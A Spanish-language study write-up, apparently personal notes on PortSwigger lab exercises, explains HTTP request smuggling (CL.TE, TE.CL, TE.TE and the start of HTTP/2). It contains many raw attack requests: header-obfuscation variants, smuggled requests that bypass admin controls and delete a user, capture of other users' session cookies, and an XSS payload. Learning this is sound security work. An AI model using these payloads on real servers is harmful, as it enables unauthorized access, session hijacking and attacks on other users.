@@ -1,0 +1,759 @@
+<h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Planteamiento del concepto.
+    <ul>
+      <li>1.1. Introducción.</li>
+      <li>1.2. Proceso al detalle.</li>
+    </ul>
+  </li>
+  <li>2 Planteamiento de la vulnerabilidad.</li>
+  <li>3 Ejecutando el ataque.
+    <ul>
+      <li>3.2. Vulnerabilidades CL.TE.</li>
+      <li>3.3. TE.CL Vulnerabilities.</li>
+      <li>3.4. TE.TE. Ofuscación de la cabecera TE.</li>
+    </ul>
+  </li>
+  <li>4 Identificación de vulnerabilidades HTTP request smuggling.
+    <ul>
+      <li>4.1. Técnicas basadas en sincronización.</li>
+      <li>4.2. Confirmación de vulnerabilidades.</li>
+    </ul>
+  </li>
+  <li>5 Exploiting HTTP Request Smuggling.
+    <ul>
+      <li>5.1. Bypass front-end security controls.</li>
+      <li>5.2. Revealing front-end request rewriting.</li>
+      <li>5.3. Capturando requests de otros usuarios.</li>
+      <li>5.4. Using HTTP Request smuggler to perfom XSS attacks.</li>
+    </ul>
+  </li>
+  <li>6 Advanced HTTP Request Smuggling y HTTP/2 Request Smuggling.
+    <ul>
+      <li>6.1. Introducción.</li>
+      <li>6.2. HTTP/2 message length.</li>
+      <li>6.3. HTTP/2 Downgrading.</li>
+      <li>6.4. Vulnerabilidades.
+        <ul>
+          <li>6.4.1. Vulnerabilidades H2.CL.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="1-planteamiento-del-concepto">1. Planteamiento del concepto.</h3>
+
+<h4 id="11-introducción">1.1. Introducción.</h4>
+
+<p>El <strong>HTTP request smuggling</strong> es una técnica para interferir con la forma en la que un sitio web procesa secuencias de HTTP request que se reciben de uno o más usuarios. </p>
+
+<p>Las vulnerabilidades de este tipo suelen ser críticas. Permite a un atacante eludir los controles de seguridad, obtener acceso no autorizado a datos confidenciales y comprometer directamente a otros usuarios de la aplicación.</p>
+
+<p><br /></p>
+
+<h4 id="12-proceso-al-detalle">1.2. Proceso al detalle.</h4>
+
+<p>Las aplicaciones web actuales emplean, con frecuencia, cadenas de servidores HTTP entre los usuarios y el punto final del back-end (server-chains). </p>
+
+<p>Los usuarios envían solicitudes a un servidor front-end (a veces denominado equilibrador de carga o proxy inverso) y este servidor reenvía las solicitudes a uno o más servidores back-end, es último normalmente envía varias solicitudes en batería a través de la misma conexión de red. </p>
+
+<p>El mecanismo es muy simple: <strong>las solicitudes HTTP se envían una tras otra y el servidor receptor analiza diversos “headers” de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente</strong>:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514110120.png" text-align="center" />
+</div>
+
+<p>Si este sistema estuviera mal implementado y los distintos servidores no tuvieran un protocolo de actuación coordinado, un atacante podría envair una solicitud ambigua que confunda a la cadena de servidores con consecuencias fatales:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514110509.png" text-align="center" />
+</div>
+
+<p><strong>Para todo esto hay que recordar que la transmisión de información se basa en bytes. Cuando se envían varias request los paquetes de bytes pertenecientes a ambaras request viajan juntos en batería. El mecanismo de confusión del request smuggling se basa en engañar al servidor para que tome bytes de un request asumiendo que son de otra request contaminando así el contenido de la misma.</strong></p>
+
+<p><br /></p>
+
+<h3 id="2-planteamiento-de-la-vulnerabilidad">2. Planteamiento de la vulnerabilidad.</h3>
+
+<p>Fundamentalmente, los servidores emplean dos headers para saber cuál es el final de una request:</p>
+
+<ul>
+  <li>
+    <p><strong>Content-Length</strong>: Especifica el número de bytes contenidos en el cuerpo del menasje.</p>
+  </li>
+  <li>
+    <p><strong>Transfer-Encoding</strong>: El encabezado Transfer-Encoding se puede usar para especificar que el cuerpo del mensaje usa codificación fragmentada. <strong>Esto significa que el cuerpo del mensaje contiene uno o más fragmentos de datos</strong>. Cada fragmento consta del tamaño del fragmento en bytes (expresado en hexadecimal), seguido de una nueva línea, seguido del contenido del fragmento. <strong>El mensaje se termina con un trozo que contiene únicamente el cero</strong>.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Nota:</strong></p>
+
+<p><strong>Muchos security testers desconocen que la codificación fragmentada se puede usar en solicitudes HTTP, por dos razones:</strong></p>
+
+<ul>
+  <li>
+    <p>Burp Suite desempaqueta automáticamente la codificación fragmentada para que los mensajes sean más fáciles de ver y editar.**</p>
+  </li>
+  <li>
+    <p><strong>Los navegadores normalmente no usan codificación fragmentada en las solicitudes, y normalmente solo se ve en las respuestas del servidor.</strong></p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p>Así, como hay dos métodos de especificación del tamaño de la request, es posible para en un mismo mensaje emplear los dos métodos a la vez.</p>
+
+<p>Para prevenir los posibles problemas que puedan venir derivados de esta situación, si ambas cabeceras están presentes, entonces la cabecera Content-Length es ignorada y aunque esto pueda ser suficiente para un sólo servidor, no lo es cuando interviene en el envío de la request una cadena de servidores.</p>
+
+<p>Esto es debido a que:</p>
+
+<ul>
+  <li>
+    <p>Algunos servidores no adminten la cabecera <em>Transfer-Encoding</em>.</p>
+  </li>
+  <li>
+    <p>De entre los servidores que si admiten dicha cabecera pueden ser inducidos a no procesarla si esta se ofusca de ciertas formas.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="3-ejecutando-el-ataque">3. Ejecutando el ataque.</h3>
+
+<p>En términos muy simples, el <em>HTTP request smuggling attack</em> se efectúa introduciendo ambas cabeceras <em>Content-Length</em> y <em>Transfer-Encoding</em> en una request HTTP para provocar una inferencia en el procesamiento de la misma en el back-end.</p>
+
+<p>Técnicamente el proceso en el que este se lleva a cabo depende del comportamiento de la cadena de servidores involucrada. Suponiéndo que sean dos servidores (front-end server y back-end server) distinguimos los siguientes casos:</p>
+
+<ul>
+  <li>
+    <p><strong>CL.TE</strong>: El front-end utiliza la cabecera Content-Length y el back-end emplea el Transfer-Encoding.</p>
+  </li>
+  <li>
+    <p><strong>TE.CL</strong>: Es el contexto inverso.</p>
+  </li>
+  <li>
+    <p><strong>TE.TE.</strong>: Ambos emplean la cabecera <em>Transfer-Encoding</em>.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="32-vulnerabilidades-clte">3.2. Vulnerabilidades CL.TE.</h4>
+
+<p>En este contexto, podemos emplear una request como la siguiente:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+</code></pre>
+
+<p>De esta manera, el servidor front-end procesa la cabecera <em>Content-Length</em> y asume que el tamaño de la request es 13 (hasta el final de SMUGGLED, contando cada caracter y cada salto de línea) y se la envía al servidor del back-end.</p>
+
+<p>En el back-end, el servidor por el contrario procesa la Transfer-Encoding y trata el mensaje como si estuviera codificada en fragmentos, de forma que analiza el primer fragmento que resulta ser un 0 y por tanto lo interpreta como el final de la request y trata los bytes correspondientes al término SMUGGLED como el inicio de la siguiente request.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: HTTP request smuggling, basic CL.TE vulnerability</strong></p>
+
+<p>Este laboratorio simula una aplicación web que emplea dos servidores (front/back-end) para procesar las request.</p>
+
+<p>El front no procesa codificación en fragmentos y devuelve cualquier request cuyo método no sea GET o POST.</p>
+
+<p>Para resolver este laboratorio manipula el procesamiento de una request en el back-end de forma que la siguiente request aparente utilizar un método que no coincida con GET o POST y sea desechada.</p>
+
+<p>Nos introducimos en el laboratorio e introducimos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Connection: keep-alive
+Cookie:your-cookie
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+</code></pre>
+
+<p>De forma:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514193132.png" text-align="center" />
+</div>
+
+<p>Y al intentar emitirla dos veces obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514193200.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="33-tecl-vulnerabilities">3.3. TE.CL Vulnerabilities.</h4>
+
+<p>En esta ocasión, empleamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+
+8
+SMUGGLED
+0
+</code></pre>
+
+<p>Notemos que en este caso hay dos saltos de línea antes del 8. Para enviar esta solicitud usando Burp Repeater, primero deberá ir al menú y asegurarse de que la opción “Update Content-Length” no esté marcada.Debe incluir la secuencia final \r\n\r\n después del 0 final.</p>
+
+<p>Así, el procedimiento va como sigue, en primer lugar, el servidor del front-end procesa la cabecera <em>Transfer-Encoding</em> y envía la request entera, seguidamente, en el servidor del back-end se procesa la cabecera <em>Content-Length</em> por la que interpreta que el cuerpo de la request contiene 3 bytes; los dos saltos de línea y el 8 y considera que los bytes que constituyen el término SMUGGLED pertenecen a la siguiente request.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: HTTP request smuggling, basic TE.CL vulnerability</strong> (No funciona: problemas al introducir la cabecera Transfer- Encoding).</p>
+
+<p>Esta práctica de laboratorio incluye un servidor front-end y back-end, y el servidor back-end no admite la codificación fragmentada. El servidor front-end rechaza las solicitudes que no utilizan el método GET o POST.</p>
+
+<p>Para resolver el laboratorio, pase de contrabando una solicitud al servidor de back-end, de modo que la próxima solicitud procesada por el servidor de back-end parezca usar el método GPOST.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220515015822.png" text-align="center" />
+</div>
+
+<p>Y envíamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+</code></pre>
+
+<p>De esta, forma, el servidor del front-end procesará la cabecera Transfer-Encoding y mandará toda la request al servidor del back end que procesará la cabecera Content-Length y sólo incluirá como parte del cuerpo de la request los cuatro primeros bytes, excluyéndo el resto para la siguiente request.</p>
+
+<p><br /></p>
+
+<h4 id="34-tete-ofuscación-de-la-cabecera-te">3.4. TE.TE. Ofuscación de la cabecera TE.</h4>
+
+<p>Aquí, los servidores front-end y back-end admiten el encabezado Transfer-Encoding, pero se puede inducir a uno de los servidores a no procesarlo ofuscando el encabezado de alguna manera.</p>
+
+<p>Hay formas potencialmente infinitas de ofuscar el encabezado Transfer-Encoding. Por ejemplo:</p>
+
+<ul>
+  <li>Transfer-Encoding: xchunked</li>
+  <li>Transfer-Encoding : chunked</li>
+  <li>Transfer-Encoding: chunked</li>
+  <li>Transfer-Encoding: x</li>
+  <li>Transfer-Encoding:[tab]chunked [space]</li>
+  <li>Transfer-Encoding: chunked X: X[\n]</li>
+  <li>[SPACE]Transfer-Encoding: chunked</li>
+  <li>X: X[\n]Transfer-Encoding : chunked</li>
+  <li>
+    <dl>
+      <dt>Transfer-Encoding</dt>
+      <dd>chunked</dd>
+    </dl>
+  </li>
+</ul>
+
+<p>Cada una de estas técnicas implica una desviación sutil de la especificación HTTP. El código real que implementa una especificación de protocolo rara vez se adhiere a ella con absoluta precisión y es común que diferentes implementaciones toleren diferentes variaciones de la especificación. <strong>Para descubrir una vulnerabilidad TE.TE, es necesario encontrar alguna variación del encabezado Transfer-Encoding de modo que solo uno de los servidores front-end o back-end lo procese, mientras que el otro servidor lo ignore.</strong></p>
+
+<p>Dependiendo de si es el servidor front-end o el back-end el que puede ser inducido a no procesar el encabezado Transfer-Encoding ofuscado, el resto del ataque tomará la misma forma que para las vulnerabilidades CL.TE o TE.CL. ya descrito.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: HTTP request smuggling, obfuscating the TE header</strong></p>
+
+<p>Este laboratorio involucra un servidor front-end y back-end, y los dos servidores manejan encabezados de solicitud HTTP duplicados de diferentes maneras. El servidor front-end rechaza las solicitudes que no utilizan el método GET o POST.</p>
+
+<p>Para resolver el laboratorio, pase de contrabando una solicitud al servidor de back-end, de modo que la próxima solicitud procesada por el servidor de back-end parezca usar el método GPOST.</p>
+
+<p>En primer lugar, accedemos al laboratorio y empezamos a mandar request con la cabecera Transfer-Encoding duplicada y con valores ofuscados para conseguir que los servidores procesen cabeceras distintas. Finalmente, la request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Cookie: session=cookiesession
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+x=1
+0
+</code></pre>
+
+<p>Finalmente termina dando resultado.</p>
+
+<p><br /></p>
+
+<h3 id="4-identificación-de-vulnerabilidades-http-request-smuggling">4. Identificación de vulnerabilidades HTTP request smuggling.</h3>
+
+<p>En general con Burp Scanner es suficiente para detectar vulnerabilidades de HTTP request smuggling. Sin embargo, vamos a ver diversos métodos de detección:</p>
+
+<p><br /></p>
+
+<h4 id="41-técnicas-basadas-en-sincronización">4.1. Técnicas basadas en sincronización.</h4>
+
+<p><strong>CL.TE utilizando técnicas de sincronización</strong></p>
+
+<p>Si una aplicación es vulnerable a HTTP Request Smuggler, una request como esta provocará un retraso:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+</code></pre>
+
+<p>Dado que el servidor front-end usa el Content-Length encabezado, solo reenviará una parte de esta solicitud, omitiendo el X. El servidor back-end usa el Transfer-Encoding encabezado, procesa el primer fragmento y luego espera a que llegue el siguiente fragmento. Esto causará un retraso de tiempo observable.</p>
+
+<p><strong>TE.CL empleando técnicas de sincronización</strong></p>
+
+<p>De la misma forma que en caso anterior, si una aplicación es vulnerable a TE.CL, entonces la sigueitne request genererá un retraso:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length:
+
+6
+0
+X
+</code></pre>
+
+<p>Dado que el servidor front-end usa el Transfer-Encoding encabezado, solo reenviará una parte de esta solicitud, omitiendo el  X . El servidor back-end usa el  Content-Length encabezado, espera más contenido en el cuerpo del mensaje y espera a que llegue el contenido restante. Esto causará un retraso de tiempo observable.</p>
+
+<p><br /></p>
+
+<h4 id="42-confirmación-de-vulnerabilidades">4.2. Confirmación de vulnerabilidades.</h4>
+
+<p>Cuando se detecta una probable vulnerabilidad de contrabando de solicitudes, puede obtener más evidencia de la vulnerabilidad explotándola para desencadenar diferencias en el contenido de las respuestas de la aplicación. Esto implica enviar dos solicitudes a la aplicación en rápida sucesión:</p>
+
+<ul>
+  <li>Una solicitud de “ataque” diseñada para interferir con el procesamiento de la siguiente solicitud.</li>
+  <li>Una solicitud “normal”.</li>
+</ul>
+
+<p><strong>Confirmación de vulnerabilidades de CL.TE mediante respuestas diferenciales</strong></p>
+
+<p>Para confirmar una vulnerabilidad CL.TE, enviaría una solicitud de ataque como esta:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/search</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">49</span>
+<span class="na">Transfer-Encoding</span><span class="p">:</span> <span class="s">chunked</span>
+
+e
+q=smuggling&amp;x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+</code></pre></div></div>
+
+<p>Con esta request el primer servidor lleva todo al segundo servidor y este último transporta la request hasta el 0 y deja lo demás para la siguiente request. La siguiente request lleva un código de error que provoca un respuesta 404.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses</strong></p>
+
+<p>Esta laboratorio envuelve una cadena de servidores front-end y back-end en el que el primero no procesa los datos fragmentos (no procesa el Transfer-Encoding Header).</p>
+
+<p>Así, mandamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: laburl
+Cookie: session=sessioncookie
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a020086035dd240c0d4756e00ee00e9.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+</code></pre>
+
+<p>Y al mandar dos veces la request:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220623180208.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Confirmando vulnerabilidades TE.CL mediante respuestas diferenciales</strong></p>
+
+<p>Para confirmar una vulnerabilidad TE.CL, enviaría una solicitud de ataque como esta:</p>
+
+<pre><code class="language-HTTP">POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+x=
+0
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses</strong></p>
+
+<p>Lanzamos la request anterior adheriendo la parte que comienza desde Content-Type hasta el final a una request normal al sitio web y la lanzamos dos veces desde el repeater obteniendo en la segunda repeater el error 404.</p>
+
+<p><br /></p>
+
+<h3 id="5-exploiting-http-request-smuggling">5. Exploiting HTTP Request Smuggling.</h3>
+
+<p>Ahora que tenemos nociones básicas acerca de cómo funciona el Request Smuggling, vamos a ver en qué contextos podemos utilizarlos para llevar a cabo qué ataques:</p>
+
+<p><br /></p>
+
+<h4 id="51-bypass-front-end-security-controls">5.1. Bypass front-end security controls.</h4>
+
+<p>En algunas aplicaciones, el servidor front-end se utiliza para implementar algunos controles de seguridad, decidiendo si se permite el procesamiento de solicitudes individuales. Las solicitudes permitidas se reenvían al servidor de back-end, donde se considera que han pasado por los controles de front-end.</p>
+
+<p>Por ejemplo, suponga que una aplicación utiliza el servidor front-end para implementar restricciones de control de acceso y solo reenvía solicitudes si el usuario está autorizado para acceder a la URL solicitada. El servidor back-end acepta posteriormente cada solicitud sin más verificación. </p>
+
+<p>En esta situación, se puede emplear un ataque de HTTP Request Smuggling para eludir los controles de acceso, pasando de contrabando una solicitud a una URL restringida. Supongámos que el usuario tiene acceso al /home pero no al /admin:</p>
+
+<pre><code class="language-HTTP">POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+</code></pre>
+
+<p><br /></p>
+
+<p>El primer servidor asume toda el contenido como una única request dirigida a /home procesando el contenido de la cabecera Content-Length mientras que el servidor back-end (que no lleva a cabo ninguna medida de seguridad debido a la confianza que deposita en el front-end) procesa la cabecera Transfer-Encoding observa que hay dos solicitudes, una para /home y otra para /admin.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</strong></p>
+
+<p>Este laboratorio contiene un servidor front-end que no procesa los datos fragmentados y un servidor back-end.</p>
+
+<p>Al acceder al laboratorio observamos que tenemos el paht a /admin bloqueado. De esta forma y con la finalidad de realizar un bypass mandamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+</code></pre>
+
+<p>Sin embargo, nos aparece un mensaje de error informandomos de que el /admin path está reservado para usuarios locales. De forma que añadimos las siguientes cabeceras:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+</code></pre>
+
+<p>Y vemos que tenemos acceso al panel de administrador. Sólo queda modificar la request anterior para borrar al usuario carlos modificando la URL: GET /admin/delete?username=carlos HTTP/1.1</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: Exploit HTTP request smuggling to bypass front-end security controls, TE.CL vulnearbility</strong></p>
+
+<p>De la misma forma que en el laboratorio anterior manejamos de forma maliciosa las cabeceras Transfer-Encoding y Content-Type para introducir una request a /admin que no sea procesada por el fornt end pero si por el back-end.</p>
+
+<p>Pero finalmente terminamos intrudociendo:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+</code></pre>
+
+<p><br /></p>
+
+<h4 id="52-revealing-front-end-request-rewriting">5.2. Revealing front-end request rewriting.</h4>
+
+<p>Puede ser que el servidor front-end reescriba la solicitud antes de reenviarla al servidor back-end. Esto puede utilizarse para conseguir que en dicha reescritura se incorpore contenido malicioso en la request.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 8: Exploiting HTTP request smuggling to reveal front-end request rewriting</strong></p>
+
+<p>Este laboratorio involucra un servidor front-end que reescribe las solicitudes que manda al back-end y no procesa los datos fragmentados.</p>
+
+<p>Hay un panel de administrador que sólo es accesible para usuarios locales y el servidor front-end añade una cabecera que contiene la IP del solicitante.</p>
+
+<p>La aplicación web contiene una barra de búsqueda que refleja el input introducido en la respuesta HTTP. De esta forma, envíamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+</code></pre>
+
+<p>Así, como el servidor front-end no procesa la Transfer-Encoding Header, envía todo como si fuera una única request al servidor back-end y este divide el contenido en dos request, en el cual el segundo tiene un tamaño de 200 bytes. De esta forma, cerca de 200 bytes de información de la sigueiten request se adhiere al parámetro search test que se refleja en la respuesta HTTP:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220625193216.png" text-align="center" />
+</div>
+
+<p>Así tenemos acceso directo a la forma en la que el servidor del front end reescribe las request antes de enviarlas al servidor del back-end y es importante notar la cabecera X-DrGgIK-Ip: ip, que contiene la IP del solicitante.</p>
+
+<p>Basándonos en esta inforamción, enviamos un GET /admin con dicha cabecera:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+0
+
+
+
+GET /admin HTTP/1.1
+X-DrGgIK-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+</code></pre>
+
+<p><br /></p>
+
+<p>Observamos que da resultado y en consecuencia modificamos la URL para borrar al usuario carlos y completar así el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="53-capturando-requests-de-otros-usuarios">5.3. Capturando requests de otros usuarios.</h4>
+
+<p>Si la aplicación contiene algún tipo de funcionalidad que permita almacenar y/o recuperar datos textuales, entonces se puede utilizar el HTTP Request Smuggling para capturar el contenido de las solicitudes de otros usuarios. Estos probablemente incluirán tokens de sesión, habilitación de ataques de secuestro de sesión u otros datos confidenciales enviados por el usuario. Las funciones adecuadas para usar como vehículo para este ataque serían comentarios, correos electrónicos, descripciones de perfil, nombres de pantalla, etc.</p>
+
+<p>Para realizar el ataque, debe pasar de contrabando una solicitud que envíe datos a la función de almacenamiento, con el parámetro que contiene los datos ubicado en último lugar en la solicitud. Tal y como hemos hecho en el ejemplo anterior:</p>
+
+<pre><code class="language-HTTP">
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 324
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net&amp;comment=
+</code></pre>
+
+<p>De nuevo, como el Content-Length contiene una cantidad más exagerada de bytes que la que se aporta en la request, el contenido de la siguiente request se adherira al parámetro comment que se verá reflejada en la sección de comentarios:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 9: Obteniendo contenido de las requests de otros usuarios</strong></p>
+
+<p>Este laboratorio involucra un servidor front-end y back-end, y el servidor front-end no admite la codificación fragmentada.</p>
+
+<p>Para resolver el laboratorio, vamos a pasar de contrabando una solicitud al servidor back-end que hace que la solicitud del siguiente usuario se almacene en la aplicación. Luego recupere la solicitud del próximo usuario y use las cookies del usuario víctima para acceder a su cuenta:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+csrf=your-csrf-token&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=test
+</code></pre>
+
+<p>Por un fallo del laboratorio el usuario Carlos no tiene cookie de sesión y por tanto este no puede ser completado. Pero esa sería la resolución del laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="54-using-http-request-smuggler-to-perfom-xss-attacks">5.4. Using HTTP Request smuggler to perfom XSS attacks.</h4>
+
+<p>Si una aplicación es vulnerable al contrabando de solicitudes HTTP y también contiene una vulnerabilidad Reflected XSS, puede usar un ataque de Request Smuggling para atacar a otros usuarios de la aplicación. Este enfoque es superior a la explotación normal de XSS reflejado de dos maneras:</p>
+
+<ul>
+  <li>No requiere interacción con los usuarios víctimas. Simplemente pase de contrabando una solicitud que contenga el payload y la siguiente solicitud del usuario procesada por el servidor back-end se verá afectada.</li>
+  <li>Se puede usar para explotar el comportamiento de XSS en partes de la solicitud que no se pueden controlar de manera trivial en un ataque XSS reflejado normal, como los encabezados de solicitud HTTP.</li>
+</ul>
+
+<p><br /></p>
+
+<p>Por ejemplo, suponga que una aplicación tiene una vulnerabilidad XSS reflejada en el User-Agent encabezado. Puede explotar esto en un ataque de contrabando de solicitudes de la siguiente manera:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;
+Foo: X
+</code></pre>
+
+<p>La solicitud del próximo usuario se adjuntará a la solicitud de contrabando y recibirá la carga útil de XSS reflejada en la respuesta.</p>
+
+<p><br /></p>
+
+<p>**Laboratorio 10:</p>
+
+<p><br /></p>
+
+<h3 id="6-advanced-http-request-smuggling-y-http2-request-smuggling">6. Advanced HTTP Request Smuggling y HTTP/2 Request Smuggling.</h3>
+
+<h4 id="61-introducción">6.1. Introducción.</h4>
+
+<p>En esta sección, le mostraremos cómo, contrariamente a la creencia popular, la implementación de HTTP/2 en realidad ha hecho que muchos sitios web sean más vulnerables al contrabando de solicitudes, incluso si antes estaban a salvo de este tipo de ataques.</p>
+
+<p><br /></p>
+
+<h4 id="62-http2-message-length">6.2. HTTP/2 message length.</h4>
+
+<p>Como sabemos, <strong>el HTTP Request Smuggling se trata fundamentalmente de explotar las discrepancias entre cómo los diferentes servidores interpretan la longitud de una solicitud</strong>. HTTP/2 introduce un mecanismo único y robusto para hacer esto, que durante mucho tiempo se pensó que lo haría inherentemente inmune al HTTP Request Smuggling.</p>
+
+<p>Aunque no verá esto en Burp, <strong>los mensajes HTTP/2 se envían como una serie de “marcos” separados. Cada marco está precedido por un campo de longitud explícito, que le dice al servidor exactamente cuántos bytes leer. Por lo tanto, la longitud de la solicitud es la suma de las longitudes de sus marcos</strong>.</p>
+
